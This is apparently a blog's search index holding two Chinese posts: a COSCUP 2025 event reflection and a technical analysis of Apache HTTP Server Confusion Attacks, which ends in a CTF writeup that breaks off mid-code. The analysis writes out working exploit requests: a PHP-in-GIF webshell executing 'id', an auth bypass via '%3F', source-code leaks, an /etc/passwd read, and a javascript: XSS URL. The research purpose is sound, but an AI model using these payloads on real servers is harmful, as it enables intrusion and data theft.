<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>COSCUP 2025 心得</title>
      <link href="/2025/08/08/2025-COSCUP/"/>
      <url>/2025/08/08/2025-COSCUP/</url>
      
        <content type="html"><![CDATA[<p>現在時間是 2025 年 8 月 9 日，也就是 COSCUP 的 Day 1，但因為我明天人在台南，所以我的 COSCUP 已經結束了～</p><p><img src="/posts/2025-COSCUP/image0.webp" alt="第一次在 COSCUP 演講"></p><h2 id="工人？協調人？講者？會眾？"><a href="#工人？協調人？講者？會眾？" class="headerlink" title="工人？協調人？講者？會眾？"></a>工人？協調人？講者？會眾？</h2><p>故事要從去年說起，去年在完全狀況外的情況下加入 COSCUP 議程組志工，花了許多的時間在理解 COSCUP 的運作規則，然後就混混的過完了 COSCUP 2024。今年總算是比較理解 COSCUP 的運作模式了，但由於議程組「Skip Year」的制度，所以今年準確來講並不算工人。雖然今年幾乎沒有碰到議程組的工作，但還是接下了 COSCUP 與 HITCON 合作的聯名軌協調人一職，也因為這次機會，總算是有機會能夠和寬寬搭上話了！✌️</p><p>今年，因為做了一個開源的物聯網駭客工具——HackMaster Pi，所以就投了今年 COSCUP 和 HITCON 兩場活動的議程，雖然 HITCON 沒有上，但還是感謝寬寬能夠讓我在 COSCUP 和 HITCON 的聯名軌上，能夠有機會上台演講。</p><p>雖然今年只去了一天，沒有太多時間聽議程、交流，不過還是有撥空去攤位的地方逛逛。現場展示了模組化的電腦 <a href="https://frame.work/">Framework</a>，他模組化的精神加上不會太貴的售價讓我超級心動，只可惜現在的主力 Macbook 很耐操，<del>找不到藉口可以換電腦</del>，等 5 年後我的電腦運算速度太慢的時候，我一定要買一台 Framework 的筆電（希望那時候的 Framework 外觀可以更好看）。除此之外，因為前夜派對 denny 把 SITCON 的貼紙拿去宣傳，所以我只好很不要臉的也把 ISIP 高中職跨校資安社團 ZeroDay C00Kie 零日餅乾社的貼紙拿去 SITCON 攤位擺了。</p><p><img src="/posts/2025-COSCUP/image1.webp" alt="ISIP 高中職跨校資安社團 ZeroDay C00Kie 零日餅乾社的貼紙"></p><h2 id="前夜派對"><a href="#前夜派對" class="headerlink" title="前夜派對"></a>前夜派對</h2><p>前夜派對雖然主要的功能是交流，但「喝什麼」對我來說也很重要，今年一樣提供了台灣啤酒和一個飲料，啤酒的部分”聽說”不太好喝，飲料這次是無糖的紅茶，我個人不太喜歡。</p><p>雖然我沒有和太多人聊天，但看到很多外國人在現場 Live Demo 了各種有趣的玩具，像是 Airpods 的模擬等，害我在接待社群、贊助商的時候，手機一直跳出彈出式視窗，為我隔天的議程加入了一些有趣的連結。</p><p>但沒關係！前夜派對沒吃好，自己加一場就好，於是我們議程組就跑去隔壁的千雲拉麵吃宵夜(?)，我點的拉麵一碗 350 元，雖然有點小貴，但在派對上講了一堆話之後，能夠喝上一口熱拉麵湯，簡直是太享受了！還有人說，我們很像日本的社畜下班後去吃拉麵。</p><p>p.s. SITCON 那群好像也去隔壁的麵屋雞金吃拉麵。</p><p><img src="/posts/2025-COSCUP/image2.webp" alt="SITCON 們的拉麵"></p><h2 id="人生首次的公開演講"><a href="#人生首次的公開演講" class="headerlink" title="人生首次的公開演講"></a>人生首次的公開演講</h2><p>這大概是我人生中第一次在公開的場合演講吧，這次以「只要一張小朋友：利用樹莓派打造物聯網攻擊工具——HackMaster Pi」為題，分享我製作的開源專案。可能是因為前幾天在 Threads 上的宣傳吧，早上場的演講幾乎是坐滿整間教室。沒想到下午才是大魔王，教室是上午的兩倍，還來了許多大咖的來賓，但也因此偷到了很多顆 GitHub 星星。最讓我印象深刻的是，在結束後有會眾覺得這個專案很酷，想要立刻跑去光華商場買材料來玩。啊可是還有很多功能還沒做出來欸！！！</p><p><img src="/posts/2025-COSCUP/image3.webp" alt="好多會眾的大教室"></p><h2 id="趕場咯～"><a href="#趕場咯～" class="headerlink" title="趕場咯～"></a>趕場咯～</h2><p>因為晚上要到台南參加 AIS3 Junior，所以我結束後立刻搭 Uber 衝向台北車站，並在列車進站的同時到達月台。祝福我的行李箱不要解體。</p><p><img src="/posts/2025-COSCUP/image4.webp" alt="附上貴貴的 Uber"></p><p>附上貴貴的 Uber～～</p><h2 id="結尾"><a href="#結尾" class="headerlink" title="結尾"></a>結尾</h2><p>今天實在發生太多有趣的事情了，所以這篇文章是我在前往台南的高鐵上寫的喔！如果有錯字或新內容，我會再更新。</p><p>不免俗的還是講一下 50 字心得好了。我終於搞懂 COSCUP 是如何運作的了，今年其實很想待滿完整的兩天，但因為趕場的關係很多聚餐、拍形象張等都沒有參與到，希望明年我是個認真的議程組組員，然後努力把兩天的活動待好待慢。</p><p>最後，這次演講主題的專案 HackMaster Pi 如果還沒按星星的話，快！連結這裡：<a href="https://github.com/1PingSun/HackMaster-Pi">https://github.com/1PingSun/HackMaster-Pi</a>。</p><p>以上。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Event </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache HTTP Server Confusion Attacks 之技術分析</title>
      <link href="/2025/07/28/2025-Apache-Confusion-Attacks/"/>
      <url>/2025/07/28/2025-Apache-Confusion-Attacks/</url>
      
        <content type="html"><![CDATA[<h2 id="壹、摘要"><a href="#壹、摘要" class="headerlink" title="壹、摘要"></a>壹、摘要</h2><p>常見的網頁伺服器包含 Apache HTTP Server、Nginx 和 IIS 等，其中 Apache HTTP Server 因開源、跨平台等優點被廣泛使用，然而卻在去年（2024）被 Orange Tsai 通報了高達 9 個漏洞，並將這類攻擊命名為「Confusion Attacks」。本技術分析報告將針對 Orange Tsai 在 Black Hat 2024 的演講《Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!》中提出的技術進行研究分析。雖然相關漏洞於新版 2.4.60 版本已進行修復，但因為許多更新修復無法向下兼容，因此若網站管理者任意更新，將可能導致許多舊有的設定失效。</p><h2 id="貳、Confusion-Attacks"><a href="#貳、Confusion-Attacks" class="headerlink" title="貳、Confusion Attacks"></a>貳、Confusion Attacks</h2><p>在了解 Confusion Attacks 之前，需要先了解 Apache HTTP Server 的架構。Apache HTTP Server 由許多小模組組成（<a href="https://httpd.apache.org/docs/2.4/mod/">官方共列出 132 個模組</a>），雖然這些模組各自可能不存在漏洞，但因為沒有了解模組間的實作細節，產生「交互作用」的問題，因此將其命名為「Confusion Attacks」。以下是發展出的攻擊：</p><ol><li>Filename Confusion</li><li>DocumentRoot Confusion</li><li>Handler Confusion</li></ol><p>從以上攻擊出發，他們找到了 9 個漏洞：</p><ol><li><strong>CVE-2024-38472</strong> - Apache HTTP Server on Windows UNC SSRF</li><li><strong>CVE-2024-39573</strong> - Apache HTTP Server proxy encoding problem</li><li><strong>CVE-2024-38477</strong> - Apache HTTP Server: Crash resulting in Denial of Service in mod_proxy via a malicious request</li><li><strong>CVE-2024-38476</strong> - Apache HTTP Server may use exploitable/malicious backend application output to run local handlers via internal redirect</li><li><strong>CVE-2024-38475</strong> - Apache HTTP Server weakness in mod_rewrite when first segment of substitution matches filesystem path</li><li><strong>CVE-2024-38474</strong> - Apache HTTP Server weakness with encoded question marks in backreferences</li><li><strong>CVE-2024-38473</strong> - Apache HTTP Server proxy encoding problem</li><li><strong>CVE-2023-38709</strong> - Apache HTTP Server: HTTP response splitting</li><li><strong>CVE-2024-??????</strong> - [redacted]</li></ol><p>本研究分析報告將著重在「Filename Confusion」及「DocumentRoot Confusion」，並帶入 CTF 題目 Writeup 及自製的 AI 解題工具。</p><h3 id="一、Filename-Confusion"><a href="#一、Filename-Confusion" class="headerlink" title="一、Filename Confusion"></a>一、Filename Confusion</h3><h4 id="（一）路徑截斷"><a href="#（一）路徑截斷" class="headerlink" title="（一）路徑截斷"></a>（一）路徑截斷</h4><p><strong>漏洞觸發條件：</strong></p><ul><li>存在 <code>RewriteRule</code> 規則進行路徑重寫</li><li>攻擊者可以控制 URL 路徑中的部分內容</li></ul><p><code>mod_rewrite</code> 模組可以透過 <code>RewriteRule</code> 語法將路徑根據規則改寫。在改寫路徑時，會透過 <code>splitout_queryargs()</code> 強制將其視為網址，導致可透過 <code>%3F</code>（<code>?</code> 的 URL 編碼）截斷路徑。</p><pre><code class="hljs apacheconf"><span class="hljs-attribute">RewriteRule</span> Pattern Substitution<span class="hljs-meta"> [flags]</span></code></pre><p><strong>Path:</strong> <a href="https://github.com/apache/httpd/blob/2.4.58/modules/mappers/mod_rewrite.c#L4141">modules/mappers/mod_rewrite.c#L4141</a></p><pre><code class="hljs c"><span class="hljs-comment">/*</span><span class="hljs-comment"> * Apply a single RewriteRule</span><span class="hljs-comment"> */</span><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">apply_rewrite_rule</span><span class="hljs-params">(rewriterule_entry *p, rewrite_ctx *ctx)</span>{    <span class="hljs-type">ap_regmatch_t</span> regmatch[AP_MAX_REG_MATCH];    <span class="hljs-type">apr_array_header_t</span> *rewriteconds;    rewritecond_entry *conds;        <span class="hljs-comment">// [...]</span>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; rewriteconds-&gt;nelts; ++i) {        rewritecond_entry *c = &amp;conds[i];        rc = apply_rewrite_cond(c, ctx);                <span class="hljs-comment">// [...] do the remaining stuff</span>            }        <span class="hljs-comment">/* Now adjust API's knowledge about r-&gt;filename and r-&gt;args */</span>    r-&gt;filename = newuri;    <span class="hljs-keyword">if</span> (ctx-&gt;perdir &amp;&amp; (p-&gt;flags &amp; RULEFLAG_DISCARDPATHINFO)) {        r-&gt;path_info = <span class="hljs-literal">NULL</span>;    }    splitout_queryargs(r, p-&gt;flags);         <span class="hljs-comment">// &lt;------- [!!!] Truncate the `r-&gt;filename`</span>        <span class="hljs-comment">// [...]</span>}</code></pre><p>想像下方 <code>RewriteRule</code> 規則：</p><pre><code class="hljs apacheconf"><span class="hljs-attribute">RewriteEngine</span> <span class="hljs-literal">On</span><span class="hljs-attribute">RewriteRule</span> <span class="hljs-string">"^/user/(.+)$"</span> <span class="hljs-string">"/var/user/$1/profile.yml"</span></code></pre><p>伺服器會依據路徑 <code>/user/</code> 之後的使用者名稱，回應相對應的個人資料檔案：</p><pre><code class="hljs bash">$ curl http://server/user/1Ping<span class="hljs-comment"># the output of file `/var/user/1Ping/profile.yml`</span></code></pre><p>由於 <code>mod_rewrite</code> 模組的路徑改寫會將當作網址處理，因此可透過 <code>?</code> 截斷後面的 <code>/profile.yml</code>。</p><pre><code class="hljs bash">$ curl http://server/user/1Ping%2Fsecret.yml%3F<span class="hljs-comment"># the output of file `/var/user/1Ping/secret.yml`</span></code></pre><h4 id="（二）誤導-RewriteFlag-規則"><a href="#（二）誤導-RewriteFlag-規則" class="headerlink" title="（二）誤導 RewriteFlag 規則"></a>（二）誤導 <code>RewriteFlag</code> 規則</h4><p><strong>漏洞觸發條件：</strong></p><ul><li>使用 <code>mod_rewrite</code> 模組且設定基於副檔名的處理規則</li><li>存在文件上傳功能或可控制的檔案內容</li><li><code>RewriteRule</code> 規則基於檔案副檔名進行比對（如 <code>\.php$</code>）</li></ul><p>除了誤導改寫網址外，也可以嘗試誤導 <code>RewriteFlag</code> 的規則。想像網站透過以下規則處理請求，當結尾 <code>.php</code> 時，則加上相對應的處理器，也可以是加上環境變數或 <code>Content-Type</code>。</p><pre><code class="hljs apacheconf"><span class="hljs-attribute">RewriteEngine</span> <span class="hljs-literal">On</span><span class="hljs-attribute">RewriteRule</span>  ^(.+\.php)$  $<span class="hljs-number">1</span> <span class="hljs-meta"> [H=application/x-httpd-php]</span></code></pre><p>當請求一個資源 <code>1.gif%3fooo.php</code> 時，因為符合上方規則，因此會將其解析成 <code>php</code> 檔並執行，然而 <code>mod_rewrite</code> 會將其當作網址處理，因此回應資源 <code>1.gif</code>。透過此種方式，就有機會上傳帶有 PHP 惡意程式的 GIF 圖檔製作後門程式。</p><pre><code class="hljs bash">$ curl http://server/upload/1.gif<span class="hljs-comment"># Response: GIF89a &lt;?=`id`;&gt;</span>$ curl http://server/upload/1.gif%3fooo.php<span class="hljs-comment"># Response: GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre><h4 id="（三）繞過認證與存取控制"><a href="#（三）繞過認證與存取控制" class="headerlink" title="（三）繞過認證與存取控制"></a>（三）繞過認證與存取控制</h4><ul><li>預設安裝 PHP-FPM</li><li>針對單一檔案的認證或存取控制（如 <code>&lt;Files&gt;</code> 指令）</li></ul><p>在 <code>mod_proxy</code> 模組，因為模組間對於檔案名稱理解的不一致，導致認證與存取控制的繞過。</p><p>以下是一個經典的範例，它透過 <code>File</code> 語法對單一檔案加上限制，只有被驗證的使用者才能存取 <code>admin.php</code> 檔案：</p><pre><code class="hljs apacheconf"><span class="hljs-section">&lt;Files <span class="hljs-string">"admin.php"</span>&gt;</span>    <span class="hljs-attribute">AuthType</span> Basic     <span class="hljs-attribute">AuthName</span> <span class="hljs-string">"Admin Panel"</span>    <span class="hljs-attribute">AuthUserFile</span> <span class="hljs-string">"/etc/apache2/.htpasswd"</span>    <span class="hljs-attribute">Require</span> valid-user<span class="hljs-section">&lt;/Files&gt;</span></code></pre><p>在預設有安裝 PHP-FPM 的環境中，上放設定可以直接被繞過。假設你瀏覽以下路徑：</p><pre><code class="hljs url">http://server/admin.php%3Fooo.php</code></pre><p>認證模組會將請求的檔名與保護的檔名比對，因為 <code>admin.php%3Fooo.php</code> 與 <code>admin.php</code> 不相符，因此模組認定此請求不需要被認證。</p><p>接著因 PHP-FPM 設定結尾為 <code>.php</code> 時，會透過語法 <code>SetHandler</code> 將請求轉給 <code>mod_proxy</code>。</p><p><strong>Path</strong>: /etc/apache2/mods-enabled/php8.2-fpm.conf</p><pre><code class="hljs apacheconf"><span class="hljs-comment"># Using (?:pattern) instead of (pattern) is a small optimization that</span><span class="hljs-comment"># avoid capturing the matching pattern (as $1) which isn't used here</span><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">".+\.ph(?:ar|p|tml)$"</span>&gt;</span>    <span class="hljs-attribute">SetHandler</span> <span class="hljs-string">"proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost"</span><span class="hljs-section">&lt;/FilesMatch&gt;</span></code></pre><p><code>mod_proxy</code> 會將檔案名稱重寫成以下網址，並呼叫子模組：</p><pre><code class="hljs url">proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php</code></pre><p>此時後端收到的檔案名稱已經是奇怪的格式（有一個 <code>?</code>）。因此 PHP-FPM 會對其的 <code>?</code> 部分進行分隔並執行。因此會執行檔案 <code>/var/www/html/admin.php</code>，成功繞過單一檔案的認證或存取控制設定：</p><p><strong>Path:</strong> <a href="https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044">sapi/fpm/fpm/fpm_main.c#L1044</a></p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> APACHE_PROXY_FCGI_PREFIX <span class="hljs-string">"proxy:fcgi://"</span></span><span class="hljs-meta">#<span class="hljs-keyword">define</span> APACHE_PROXY_BALANCER_PREFIX <span class="hljs-string">"proxy:balancer://"</span></span><span class="hljs-keyword">if</span> (env_script_filename &amp;&amp;    strncasecmp(env_script_filename, APACHE_PROXY_FCGI_PREFIX, <span class="hljs-keyword">sizeof</span>(APACHE_PROXY_FCGI_PREFIX) - <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) {    <span class="hljs-comment">/* advance to first character of hostname */</span>    <span class="hljs-type">char</span> *p = env_script_filename + (<span class="hljs-keyword">sizeof</span>(APACHE_PROXY_FCGI_PREFIX) - <span class="hljs-number">1</span>);    <span class="hljs-keyword">while</span> (*p != <span class="hljs-string">'\0'</span> &amp;&amp; *p != <span class="hljs-string">'/'</span>) {        p++;    <span class="hljs-comment">/* move past hostname and port */</span>    }    <span class="hljs-keyword">if</span> (*p != <span class="hljs-string">'\0'</span>) {        <span class="hljs-comment">/* Copy path portion in place to avoid memory leak.  Note</span><span class="hljs-comment">         * that this also affects what script_path_translated points</span><span class="hljs-comment">         * to. */</span>        memmove(env_script_filename, p, <span class="hljs-built_in">strlen</span>(p) + <span class="hljs-number">1</span>);        apache_was_here = <span class="hljs-number">1</span>;    }    <span class="hljs-comment">/* ignore query string if sent by Apache (RewriteRule) */</span>    p = <span class="hljs-built_in">strchr</span>(env_script_filename, <span class="hljs-string">'?'</span>);    <span class="hljs-keyword">if</span> (p) {        *p =<span class="hljs-number">0</span>;    }}</code></pre><p>在 GitHub 上可以找到許多有潛在危險的設定。</p><ul><li>限制只有內網能夠存取的檔案  <pre><code class="hljs apacheconf"><span class="hljs-comment"># protect phpinfo, only allow localhost and local network access</span><span class="hljs-section">&lt;Files php-info.php&gt;</span>    <span class="hljs-comment"># LOCAL ACCESS ONLY</span>    <span class="hljs-comment"># Require local </span>    <span class="hljs-comment"># LOCAL AND LAN ACCESS</span>    <span class="hljs-attribute">Require</span> ip <span class="hljs-number">10</span> <span class="hljs-number">172</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span><span class="hljs-section">&lt;/Files&gt;</span></code></pre></li><li>使用 <code>.htaccess</code> 阻擋的檔案  <pre><code class="hljs apacheconf"><span class="hljs-section">&lt;Files adminer.php&gt;</span>    <span class="hljs-attribute">Order</span> <span class="hljs-literal">Allow</span>,<span class="hljs-literal">Deny</span>    <span class="hljs-attribute">Deny</span> from <span class="hljs-literal">all</span><span class="hljs-section">&lt;/Files&gt;</span></code></pre>  <pre><code class="hljs apacheconf"><span class="hljs-section">&lt;Files xmlrpc.php&gt;</span>    <span class="hljs-attribute">Order</span> <span class="hljs-literal">Allow</span>,<span class="hljs-literal">Deny</span>    <span class="hljs-attribute">Deny</span> from <span class="hljs-literal">all</span><span class="hljs-section">&lt;/Files&gt;</span></code></pre></li><li>禁止直接存取的檔案  <pre><code class="hljs apacheconf"><span class="hljs-section">&lt;Files <span class="hljs-string">"cron.php"</span>&gt;</span>    <span class="hljs-attribute">Deny</span> from <span class="hljs-literal">all</span><span class="hljs-section">&lt;/Files&gt;</span></code></pre></li></ul><p>以上的範例均可透過 <code>?</code> 符號繞過。</p><h3 id="二、DocumentRoot-Confusion"><a href="#二、DocumentRoot-Confusion" class="headerlink" title="二、DocumentRoot Confusion"></a>二、DocumentRoot Confusion</h3><p>漏洞利用條件：</p><ul><li>危險的 RewriteRule，例如：  <pre><code class="hljs apacheconf"><span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^/html/(.*)$"</span>  <span class="hljs-string">"/$1.html"</span><span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^(.*)\.(css|js|ico|svg)"</span> <span class="hljs-string">"$1\.$2.gz"</span><span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^/oldwebsite/(.*)$"</span>  <span class="hljs-string">"/$1"</span><span class="hljs-attribute">RewriteCond</span> <span class="hljs-variable">%{REQUEST_METHOD}</span> OPTIONS<span class="hljs-attribute">RewriteRule</span> ^(.*)$ $<span class="hljs-number">1</span><span class="hljs-meta"> [R=200,L]</span></code></pre></li><li>啟用 <code>RewriteEngine On</code></li><li>Ubuntu/Debian 提供更多利用機會</li></ul><p>在下方的 Httpd 設定當中，若請求 <code>http://server/html/about</code>，實際上會開啟 <code>/about.html</code> 及 DocumentRoot 下的 <code>/var/www/html/about.html</code>。</p><pre><code class="hljs apacheconf"><span class="hljs-attribute">DocumentRoot</span> /var/www/html<span class="hljs-attribute">RewriteRule</span>  ^/html/(.*)$   /$<span class="hljs-number">1</span>.html</code></pre><p>原始碼如下：</p><p><strong>Path:</strong> <a href="https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939">modules/mappers/mod_rewrite.c#L4939</a></p><pre><code class="hljs apacheconf">    <span class="hljs-attribute">if</span>(!(conf-&gt;options &amp; OPTION_LEGACY_PREFIX_DOCROOT)) {        <span class="hljs-attribute">uri_reduced</span> = apr_table_get(r-&gt;notes, <span class="hljs-string">"mod_rewrite_uri_reduced"</span>);    }    <span class="hljs-attribute">if</span> (!prefix_stat(r-&gt;filename, r-&gt;pool) || uri_reduced != NULL) {     // &lt;------<span class="hljs-meta"> [1] access without root</span><span class="hljs-meta">        int res;</span><span class="hljs-meta">        char *tmp = r-&gt;uri;</span><span class="hljs-meta"></span><span class="hljs-meta">        r-&gt;uri = r-&gt;filename;</span><span class="hljs-meta">        res = ap_core_translate(r);             // &lt;------ [2] access with root</span><span class="hljs-meta">        r-&gt;uri = tmp;</span><span class="hljs-meta"></span><span class="hljs-meta">        if (res != OK) {</span><span class="hljs-meta">            rewritelog((r, 1, NULL, "prefixing with document_root of %s"</span><span class="hljs-meta">                        " FAILED", r-&gt;filename));</span><span class="hljs-meta"></span><span class="hljs-meta">            return res;</span><span class="hljs-meta">        }</span><span class="hljs-meta"></span><span class="hljs-meta">        rewritelog((r, 2, NULL, "prefixed with document_root to %s",</span><span class="hljs-meta">                    r-&gt;filename));</span><span class="hljs-meta">    }</span><span class="hljs-meta"></span><span class="hljs-meta">    rewritelog((r, 1, NULL, "go-ahead with %s [OK]", r-&gt;filename));</span><span class="hljs-meta">    return OK;</span><span class="hljs-meta">}</span></code></pre><p>如果能夠控制 <code>RewriteRule</code> 的前綴，就有機會能夠瀏覽系統上的任何檔案。以下是一些容易受影響的 <code>RewriteRule</code>：</p><pre><code class="hljs apacheconf"><span class="hljs-comment"># 1 </span><span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^/html/(.*)$"</span>  <span class="hljs-string">"/$1.html"</span><span class="hljs-comment"># 2 </span><span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^(.*)\.(css|js|ico|svg)"</span> <span class="hljs-string">"$1\.$2.gz"</span><span class="hljs-comment"># 3</span><span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^/oldwebsite/(.*)$"</span>  <span class="hljs-string">"/$1"</span><span class="hljs-comment"># 4</span><span class="hljs-attribute">RewriteCond</span> <span class="hljs-variable">%{REQUEST_METHOD}</span> OPTIONS<span class="hljs-attribute">RewriteRule</span> ^(.*)$ $<span class="hljs-number">1</span><span class="hljs-meta"> [R=200,L]</span></code></pre><p>接下來的範例將透過以下 <code>RewriteRule</code> 做示範：</p><pre><code class="hljs apacheconf"><span class="hljs-attribute">RewriteEngine</span> <span class="hljs-literal">On</span><span class="hljs-attribute">RewriteRule</span>  <span class="hljs-string">"^/html/(.*)$"</span>  <span class="hljs-string">"/$1.html"</span></code></pre><h4 id="（一）原始碼洩漏"><a href="#（一）原始碼洩漏" class="headerlink" title="（一）原始碼洩漏"></a>（一）原始碼洩漏</h4><h5 id="1-洩漏-CGI-原始碼"><a href="#1-洩漏-CGI-原始碼" class="headerlink" title="1. 洩漏 CGI 原始碼"></a>1. 洩漏 CGI 原始碼</h5><p>CGI 程式碼當中可能包含一些機密敏感資料，包含資料庫的帳號密碼等，CGI 程式碼執行時，是透過 <code>ScriptAlias</code> 與原始的目錄綁定，若使用絕對路徑請求，就能看到其原始碼。</p><pre><code class="hljs bash">$ curl http://server/cgi-bin/download.cgi<span class="hljs-comment"># the processed result from download.cgi</span>$ curl http://server/html/usr/lib/cgi-bin/download.cgi%3F<span class="hljs-comment"># #!/usr/bin/perl</span><span class="hljs-comment"># use CGI;</span><span class="hljs-comment"># ...</span><span class="hljs-comment"># # the source code of download.cgi</span></code></pre><h5 id="2-洩漏-PHP-原始碼"><a href="#2-洩漏-PHP-原始碼" class="headerlink" title="2. 洩漏 PHP 原始碼"></a>2. 洩漏 PHP 原始碼</h5><p>若只針對特定目錄或虛擬主機套用 PHP 環境，則可透過未啟用的虛擬主機存取 PHP 原始碼。</p><p>例如：<code>www.local</code> 及 <code>static.local</code> 兩台虛擬主機在同一台伺服器上，其中 <code>www.local</code> 負責執行 PHP，<code>static.local</code> 則只負責回應靜態的資源。因此透過以下範例可透過修改 <code>Host</code> 表頭取得 <code>config.php</code> 的原始碼。</p><pre><code class="hljs bash">$ curl http://www.local/config.php<span class="hljs-comment"># the processed result (empty) from config.php</span>$ curl http://www.local/var/www.local/config.php%3F -H <span class="hljs-string">"Host: static.local"</span><span class="hljs-comment"># the source code of config.php</span></code></pre><h4 id="（二）存取任意檔案"><a href="#（二）存取任意檔案" class="headerlink" title="（二）存取任意檔案"></a>（二）存取任意檔案</h4><p>透過不安全的 <code>RewriteRule</code> 雖然能夠讀取任意的檔案，但同時在 Apache HTTP Server 的設定檔模板中，預設禁止了根目錄的存取：</p><p><strong>Path:</strong> <a href="https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115">httpd/docs/conf/httpd.conf.in#L115</a></p><pre><code class="hljs apacheconf"><span class="hljs-section">&lt;Directory /&gt;</span>    <span class="hljs-attribute">AllowOverride</span> None    <span class="hljs-attribute">Require</span> <span class="hljs-literal">all</span> denied<span class="hljs-section">&lt;/Directory&gt;</span></code></pre><p>然而，在 Debian 架構的作業系統中（例如：Ubuntu），預設允許 <code>/usr/share</code>。雖然無法直接存取到 <code>/ets/passwd</code>，但還是增加了利用的機會。</p><h5 id="1-資訊洩漏"><a href="#1-資訊洩漏" class="headerlink" title="1. 資訊洩漏"></a>1. 資訊洩漏</h5><p>如果 Apache HTTP Server 安裝了 <code>websocketd</code> 服務，預設會在 <code>/usr/share/doc/websocketd/examples/php/</code> 中，放一個範例 PHP 檔 <code>dump-env.php</code>，如果伺服器為 PHP 環境，就能夠洩漏敏感的環境變數。</p><p>如果伺服器同時安裝 Nginx 或 Jetty，因為這些服務預設的 Web Root 在 <code>/usr/share</code> 下，因此就能夠取得這些服務的敏感資訊，例如 Jetty 上的 <code>web.xml</code> 設定等：</p><ul><li><code>/usr/share/nginx/html/</code></li><li><code>/usr/share/jetty9/etc/</code></li><li><code>/usr/share/jetty9/webapps/</code></li></ul><p>以下為透過存取 <code>Davical</code> 套件中 <code>setup.php</code> 唯讀複本，洩漏 <code>phpinfo()</code> 內容的範例：</p><p><img src="/posts/2025-Apache-Confusion-Attacks/image3.webp" alt="alt"></p><p>Source: <a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/">https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/</a></p><h5 id="2-XSS"><a href="#2-XSS" class="headerlink" title="2. XSS"></a>2. XSS</h5><p>在 Ubuntu Desktop 中，預設安裝了開源的辦公軟體 LibreOffice。可利用其中的檔案來執行 XSS。</p><p><strong>Path: /usr/share/libreoffice/help/help.html</strong></p><pre><code class="hljs apacheconf"><span class="hljs-attribute">var</span> url = window.location.href;<span class="hljs-attribute">var</span> n = url.indexOf('?');<span class="hljs-attribute">if</span> (n != -<span class="hljs-number">1</span>) {    // <span class="hljs-attribute">the</span> URL came from LibreOffice help (F1)    <span class="hljs-attribute">var</span> version = getParameterByName(<span class="hljs-string">"Version"</span>, url);    <span class="hljs-attribute">var</span> query = url.substr(n + <span class="hljs-number">1</span>, url.length);    <span class="hljs-attribute">var</span> newURL = version + '/index.html?' + query;    <span class="hljs-attribute">window</span>.location.replace(newURL);} <span class="hljs-attribute">else</span> {    <span class="hljs-attribute">window</span>.location.replace('latest/index.html');}</code></pre><p>可以透過不安全的 <code>RewriteRule</code> 達成 XSS 攻擊：</p><pre><code class="hljs url">http://server/html/usr/share/libreoffice/help/help.html%3F?Version=javascript:alert(1)//</code></pre><p><img src="/posts/2025-Apache-Confusion-Attacks/image4.webp" alt="alt"></p><p>Source: <a href="https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/">https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/</a></p><h5 id="3-LFI"><a href="#3-LFI" class="headerlink" title="3. LFI"></a>3. LFI</h5><p>如果伺服器安裝了一些套件，例如 JpGraph、jQuery-jFeed、WordPress 或 Moodle 外掛等，他們自帶的一些工具或文件也可以作為利用的對象，包含：</p><ul><li><code>/usr/share/doc/libphp-jpgraph-examples/examples/show-source.php</code></li><li><code>/usr/share/javascript/jquery-jfeed/proxy.php</code></li><li><code>/usr/share/moodle/mod/assignment/type/wims/getcsv.php</code></li></ul><p>以下為透過 jQuery-jFeed 中 <code>proxy.php</code> 檔讀取任意檔案的請求範例：</p><pre><code class="hljs bash">$ curl http://server/html/usr/sharejavascript/jquery-jfeed/proxy.php%3F?url=/etc/passwd&amp;foo<span class="hljs-comment"># the content of /etc/passwd</span></code></pre><h5 id="4-SSRF"><a href="#4-SSRF" class="headerlink" title="4. SSRF"></a>4. SSRF</h5><p>除此之外，也可以透過以下檔案進行 SSRF：</p><ul><li><code>/usr/share/php/magpierss/scripts/magpie_debug.php</code></li></ul><h2 id="參、深入學習"><a href="#參、深入學習" class="headerlink" title="參、深入學習"></a>參、深入學習</h2><h3 id="一、CTF-練習"><a href="#一、CTF-練習" class="headerlink" title="一、CTF 練習"></a>一、CTF 練習</h3><p>為了達到自己嘗試實作的目的，我找到了在 STDiO24CTF 中的題目 <a href="https://drive.google.com/uc?id=1Ja7va0_gm2FDCf0ueVGKCIcff53Qoaew">01_Confusion</a>，並成功取得 Flag，Writeup 如下：</p><p><strong>STDiO24CTF 01_Confusion Writeup</strong></p><ol><li>偵查：此網站提供了一個上傳檔案的功能，雖然有限制只能上傳 jpg、png、gif 或 bmp 格式的檔案，但不會利用檔案內容作為判斷依據。</li><li>偵查：在 <code>default-site.conf</code> 中，使用了不安全的 <code>RewriteRule</code>，因此可存取 DocumentRoot 以外的其他路徑。並且在存取上傳的 Exploit 時，需要在結尾加上 <code>%3F.php</code>，使其以 PHP 進行解析執行。<br> <img src="/posts/2025-Apache-Confusion-Attacks/image5.webp" alt="alt"></li><li>武裝：製作帶有惡意 PHP 程式碼的 Exploit 圖片。 <pre><code class="hljs 